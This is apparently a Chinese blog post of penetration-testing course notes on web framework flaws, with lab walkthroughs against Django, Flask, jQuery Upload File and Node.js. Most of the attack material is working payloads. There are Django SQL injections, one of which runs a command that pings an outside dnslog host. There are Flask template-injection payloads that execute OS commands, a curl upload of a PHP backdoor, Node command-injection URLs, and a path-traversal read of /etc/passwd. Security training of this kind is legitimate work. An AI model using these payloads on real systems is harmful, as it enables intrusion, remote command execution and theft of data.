![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135019295-1225499363.png)

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135026036-1118514237.png)

```plain
#知识点：
中间件及框架列表：
IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等
1、开发框架-PHP-Laravel-Thinkphp
2、开发框架-Javaweb-St2-Spring
3、开发框架-Python-django-Flask
4、开发框架-Javascript-Node.js-JQuery
5、其他框架-Java-Apache Shiro&Apache Sorl

常见语言开发框架：
PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等
JAVA：Spring MyBatis Hibernate Struts2 Springboot等
Python：Django Flask Bottle Turbobars Tornado Web2py等
Javascript：Vue.js Node.js Bootstrap JQuery Angular等

#章节内容：
常见中间件的安全测试：
1、配置不当-解析&弱口令
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击
4、安全应用-框架特定安全漏洞

#前置知识：
-中间件安全测试流程：
1、判断中间件信息-名称&版本&三方
2、判断中间件问题-配置不当&公开漏洞
3、判断中间件利用-弱口令&EXP&框架漏洞

-应用服务安全测试流程：见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等

-开发框架组件安全测试流程：
1、判断常见语言开发框架类型
2、判断开发框架存在的CVE问题
3、判断开发框架CVE漏洞利用方式
```

- Python-开发框架安全-Django&Flask

Django

```plain
Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开发。Django采用了MTV的框架模式，即模型M，视图V和模版T，使用Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序。而且Django还包含许多功能强大的第三方插件，使得Django具有较强的可扩展性。
1、cve_2019_14234 利用这个漏洞需要后台权限
环境：http://vulfocus.io/#/dashboard

需要登录到后台地址：http://123.58.236.76:61586/admin/

单引号已注入成功，SQL语句报错：
/admin/vuln/collection/?detail__a%27b=123
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135037543-1005200086.png)

```plain
创建cmd_exec：
/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)--%20

调用cmd_exec执行命令：利用到dns带外查询
/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping 34eo8q.dnslog.cn%27--%20
执行，收到反弹的命令。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135037302-2089027893.png)

```plain
2、CVE-2021-35042
环境：http://vulfocus.io/#/dashboard

只要找有输入参数的地方就可以，mysql注入点，注入与mysql一样。
测试点：http://123.58.236.76:30118/vuln/?order=

目录：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135037540-2122925904.png)

```plain
版本：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135037530-1091028497.png)

```plain
数据库名：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135037606-457866999.png)

```plain
用户名：/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20user())),1)%23
等等..
```

Flask

```plain
Flask是一个使用Python编写的轻量级Web应用框架。其WSGI工具箱采用Werkzeug ，模板引擎则使用Jinja2 .

参考：https://vulhub.org/#/environments/flask/ssti/
类似代码：
from flask import Flask
from flask import request
from flask import config
from flask import render_template_string
app = Flask(__name__)

app.config['SECRET_KEY'] = "flag{SSTI_123456}"
@app.route('/')
def hello_world():
    return 'Hello World!'

@app.errorhandler(404)
def page_not_found(e):
    template = '''
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s/h3>
    </div> <
{%% endblock %%}
''' % (request.args.get('404_url'))
    return render_template_string(template), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True)
    
    
启动代码环境：http://127.0.0.1:5000/
当去访问不存在的地址时候，就会触发代码：
{%% block body %%}
    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>%s</h3>
    </div> 
{%% endblock %%}

比如访问http://127.0.0.1:5000/daefada?404_url=1，就会在页面中显示1，因为404_url进行了传参。
render_template_string是用来渲染的，将数据进行显示。

如果这个404_url传入的参数为恶意代码，那就会形成注入，就是ssti注入。具体在前面的课程讲过。
利用POC：
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("whoami").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}

然后进行url编码：
http://127.0.0.1:5000/daefada?404_url=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22whoami%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135038165-1676966163.png)

```plain
启动环境：
cd vulhub-master/flask/ssti
sudo docker-compose up -d

访问：192.168.233.128:8000
payload：http://192.168.233.128:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D

这类型的漏洞一般是在白盒上发现的，在很黑上比较难发现。
```

- JavaScript-开发框架安全-Jquery&Node

Jquery

```plain
1、cve_2018_9207  cve_2018_9208 cve_2018_9209
描述: jQuery是一个快速、简洁的JavaScript框架，是继Prototype之后又一个优秀的JavaScript代码库（框架）于2006年1月由John Resig发布。

jQuery Upload File <= 4.0.2 中的任意文件上传
环境：http://vulfocus.io/#/dashboard


框架目录：/jquery-upload-file/，这个目录在实际中是需要抓包分析到的。
访问：http://123.58.236.76:31858/jquery-upload-file/

执行命令就可以进行任意文件上传：curl -F "myfile=@php.php" "http://123.58.236.76:31858/jquery-upload-file/php/upload.php"
php.php是一个后门文件
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135037736-2088428965.png)

```plain
然后访问：http://123.58.236.76:31858/jquery-upload-file/php/uploads/php.php
执行出phpinfo效果。
```

Node

```plain
1、cve_2021_21315
Node.js是一个基于Chrome V8引擎的JavaScript运行环境，用于方便的搭建响应速度快、易于拓展的网络应用。
Node.js-systeminformation是用于获取各种系统信息的Node.js模块,在存在命令注入漏洞的版本中，攻击者可以通过未过滤的参数中注入payload执行系统命令。
Systeminformation <  5.3.1

环境：http://vulfocus.io/#/dashboard
这里演示不是很明显，所以在本地启动演示


环境启动：node index.js
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135037676-996792657.png)

```plain
默认开启8000端口，访问：http://127.0.0.1:8000/
访问触发地址：http://127.0.0.1:8000/api/getServices?name[]=$(echo -e 'xiaodi' > test.txt)
命令：echo -e 'xiaodi' > test.txt
但是没有成功。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135038360-515150072.png)

```plain
在服务器上启动环境：
下载：git clone https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git
启动：node index.js
利用：http://175.178.151.29:8000/api/getServices?name[]=$(echo -e 'xiaodi' > test.txt)
2、cve_2017_14849
环境：http://vulfocus.io/#/dashboard

Joyent Node.js 8.6.0之前的8.5.0版本中存在安全漏洞。远程攻击者可利用该漏洞访问敏感文件。

访问抓包，修改数据包就可以完成
在返回包XPB中为：X-Powered-By: Express基本上可以确定是note.js
GET：
/static/../../../a/../../../../etc/passwd
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135038421-1868048000.png)